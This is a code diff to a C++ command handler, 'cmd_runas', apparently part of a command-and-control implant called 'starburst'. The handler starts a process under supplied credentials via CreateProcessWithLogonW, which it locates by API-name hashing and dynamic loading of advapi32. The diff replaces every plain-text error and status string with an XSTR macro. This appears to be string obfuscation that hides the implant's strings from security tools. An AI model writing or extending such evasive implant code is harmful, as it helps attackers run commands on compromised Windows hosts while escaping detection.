@@ -42,7 +42,7 @@ auto declfn starburst::cmd_runas(
     if ( !user_str || user_len == 0 || !pass_str || pass_len == 0 ||
          !cmd_str  || cmd_len  == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "need username, password, and command" ) ) );
+            XSTR( "need username, password, and command" ) );
         return;
     }
 
@@ -65,7 +65,7 @@ auto declfn starburst::cmd_runas(
     auto h_advapi32 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_advapi32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "LoadLibrary advapi32 failed" ) ) );
+            XSTR( "LoadLibrary advapi32 failed" ) );
         return;
     }
 
@@ -74,7 +74,7 @@ auto declfn starburst::cmd_runas(
             expr::hash_string( "CreateProcessWithLogonW" ) ) );
     if ( !pCreateProcessWithLogonW ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateProcessWithLogonW not found" ) ) );
+            XSTR( "CreateProcessWithLogonW not found" ) );
         return;
     }
 
@@ -115,7 +115,7 @@ auto declfn starburst::cmd_runas(
 
     if ( !ok ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateProcessWithLogonW failed" ) ) );
+            XSTR( "CreateProcessWithLogonW failed" ) );
         return;
     }
 
@@ -123,7 +123,7 @@ auto declfn starburst::cmd_runas(
     char msg[512] = { 0 };
     char num[12];
 
-    str_copy( msg, symbol<char*>( const_cast<char*>( "Process created as " ) ) );
+    str_copy( msg, XSTR( "Process created as " ) );
     uint32_t off = str_len( msg );
 
     if ( domain_buf[0] != '\0' ) {
@@ -137,7 +137,7 @@ auto declfn starburst::cmd_runas(
     memory::copy( msg + off, user_buf, ulen );
     off += ulen;
 
-    str_copy( msg + off, symbol<char*>( const_cast<char*>( " PID: " ) ) );
+    str_copy( msg + off, XSTR( " PID: " ) );
     off += str_len( msg + off );
 
     int_to_str( num, pi.dwProcessId, 10 );
